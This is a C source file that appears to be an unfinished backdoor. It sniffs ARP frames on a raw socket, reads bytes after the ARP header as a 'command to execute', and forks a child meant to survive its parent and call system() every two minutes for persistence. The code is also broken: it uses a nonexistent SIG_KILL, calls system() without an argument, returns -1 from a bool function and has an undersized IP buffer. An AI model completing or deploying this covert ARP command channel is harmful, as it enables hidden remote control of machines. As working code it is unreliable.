#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>

#define BUF_SIZE 65536
struct arp_header {
    unsigned short hardware_type;   // Hardware type (e.g., Ethernet)
    unsigned short protocol_type;   // Protocol type (e.g., IP)
    unsigned char hardware_size;    // Hardware address length
    unsigned char protocol_size;    // Protocol address length
    unsigned short opcode;          // ARP opcode (request or reply)
    unsigned char sender_mac[6];    // Sender MAC address
    unsigned char sender_ip[4];     // Sender IP address
    unsigned char target_mac[6];    // Target MAC address
    unsigned char target_ip[4];     // Target IP address
};

// Function to print the MAC address
void print_mac_address(unsigned char *mac) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

pid_t pid;
void handle_sigint(int sig) {
    if(pid > 0)
        kill(pid, SIG_KILL);
    waitpid(pid, NULL, 0);
}

bool is_me(const char *ip_address) {
    FILE *fp;
    char buffer[2048];
    bool found = 0;

    // Execute the "ip addr" command
    fp = popen("ip addr", "r");
    if (fp == NULL) {
        perror("Failed to run command");
        return -1; // Indicate error
    }

    // Read the output line by line
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        // Check if the line contains the IP address
        if (strstr(buffer, ip_address) != NULL) {
            found = 1; // IP address found
            break;
        }
    }

    // Close the pipe
    pclose(fp);

    return found; // Return 1 if found, 0 otherwise
}


void dumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

// Main packet sniffer function
int primary() {
    int sockfd;
    unsigned char buffer[BUF_SIZE];
    struct sockaddr saddr;
    struct ethhdr *eth_header;
    socklen_t saddr_len = sizeof(saddr);

    // Create a raw socket
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) {
        perror("Socket error");
        exit(EXIT_FAILURE);
    }

    while (1) {
        // Receive a packet
        int packet_len = recvfrom(sockfd, buffer, BUF_SIZE, 0, &saddr, &saddr_len);
        if (packet_len < 0) {
            perror("Recvfrom error");
            exit(EXIT_FAILURE);
        }

        // Extract Ethernet header
        eth_header = (struct ethhdr *)buffer;

        // if(eth_header->h_protocol == ETH_P_ARP){
            char *payload = (char *)(buffer + sizeof(struct ethhdr) + 4 + 4 + 6 + 4 + 6 + 4);

            // Print Ethernet header details
            printf("\nEthernet Frame\n");
            printf("Destination MAC: ");
            print_mac_address(eth_header->h_dest);
            printf("\nSource MAC: ");
            print_mac_address(eth_header->h_source);
            printf("\nProtocol: 0x%04x\n", ntohs(eth_header->h_proto));

            struct arp_header *arp_hdr = (struct arp_header *)(buffer + sizeof(struct ethhdr));

            printf("\nARP Packet\n");
            printf("Sender MAC: ");
            print_mac_address(arp_hdr->sender_mac);
            printf("\nSender IP: %d.%d.%d.%d\n", arp_hdr->sender_ip[0], arp_hdr->sender_ip[1],
                                                arp_hdr->sender_ip[2], arp_hdr->sender_ip[3]);
            printf("Target MAC: ");
            print_mac_address(arp_hdr->target_mac);
            char target_ip[15];
            snprintf(target_ip, 15, "%d.%d.%d.%d", arp_hdr->target_ip[0], arp_hdr->target_ip[1],
                                                arp_hdr->target_ip[2], arp_hdr->target_ip[3]);
            printf("\nTarget IP: %s\n", target_ip);

            // Will return true for target_ip
            if(is_me(target_ip)){
                printf("It's for me!\n");
            } else {
                printf("It's not for me :(\n");
            }

            printf("Command to execute: %s\n", payload);
        // }

    }

    close(sockfd);
    return 0;
}

int main(){
    struct sigaction sa;
    sa.sa_handler = handle_sigint;
    sa.sa_flags = 0;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);

    pid = fork();
    if(pid < 0) {
        perror("Unable to fork");
        return 1;
    }

    if(pid == 0){
        // child = rule persistence thread (should have some way of protecting)
        while(1){ // THIS WILL NOT DIE WITH PARENT!!
            system();
            sleep(120);
        }
    }
    return primary();
}
